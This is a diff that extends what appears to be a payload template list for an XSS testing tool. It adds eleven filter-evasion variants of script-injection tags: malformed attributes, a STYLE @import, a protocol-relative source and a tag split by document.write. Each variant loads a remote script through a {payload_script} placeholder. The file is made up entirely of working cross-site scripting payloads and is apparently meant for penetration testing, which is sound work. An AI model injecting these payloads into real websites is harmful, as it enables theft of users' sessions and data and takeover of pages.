@@ -1,2 +1,13 @@
 <SCRIPT SRC={payload_script}></SCRIPT>
 <SCRIPT/XSS SRC="{payload_script}"></SCRIPT>
+<SCRIPT/SRC="{payload_script}"></SCRIPT>
+<SCRIPT SRC={payload_script}?< B >
+<SCRIPT SRC=//{payload_script}/.j>
+<STYLE>@import'{payload_script}';</STYLE>
+<SCRIPT a=">" SRC="{payload_script}"></SCRIPT>
+<SCRIPT =">" SRC="{payload_script}"></SCRIPT>
+<SCRIPT a=">" '' SRC="{payload_script}"></SCRIPT>
+<SCRIPT "a='>'" SRC="{payload_script}"></SCRIPT>
+<SCRIPT a=>SRC="{payload_script}"></SCRIPT>
+<SCRIPT a=">'>" SRC="{payload_script}"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="{payload_script}"></SCRIPT>
